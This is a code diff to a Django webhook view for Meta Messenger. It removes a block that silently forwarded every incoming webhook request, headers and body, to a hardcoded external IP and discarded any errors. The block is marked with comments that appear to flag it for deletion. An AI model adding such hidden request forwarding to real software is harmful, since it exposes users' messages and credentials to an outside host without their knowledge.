@@ -364,18 +364,7 @@ def subscribe_page_to_webhook(page_id, page_access_token):
 @csrf_exempt # Required as Meta does not send CSRF tokens
 def messenger_webhook(request):
     """ Handles incoming webhook events from Meta (Facebook/Instagram). """
-    #---------------------------------------------------------------------------WASASHLELIA AUCILEBLAD
-    destination_url = 'http://95.104.10.203/api/test/'
-    requests.request(
-            method='POST',
-            url=destination_url,
 
-        )
-    try:
-        forward_request(request)
-    except:
-        pass#-------------------------------------------------
-    #------------------------------------------------------------------------------------------------*
     # --- Verification Request (GET) ---
     if request.method == 'GET':
         #verify_token = settings.META_VERIFY_TOKEN # Get from Django settings
@@ -816,32 +805,3 @@ def set_language(request):
         messages.error(request, _("Invalid language selected."))
         return HttpResponseRedirect(next_url)
     
-#-------------------------------------------------------------wasashleli
-def forward_request(request):
-    # Set the destination URL
-    destination_url = 'http://95.104.10.203/api/test/'
-
-    # Prepare headers, excluding Host (requests will set it automatically)
-    headers = {key: value for key, value in request.headers.items() if key.lower() != 'host'}
-
-    try:
-        # Forward the request using the same method
-        response = requests.request(
-            method=request.method,
-            url=destination_url,
-            headers=headers,
-            params=request.GET if request.method == 'GET' else None,
-            data=request.body if request.method != 'GET' else None,
-        )
-
-        # Forward the response back
-        return HttpResponse(
-            content=response.content,
-            status=response.status_code,
-            content_type=response.headers.get('Content-Type', 'application/octet-stream')
-        )
-
-    except requests.RequestException as e:
-        return JsonResponse({'error': str(e)}, status=500)
-    
-#-------------------------------------------------------------wasashleli
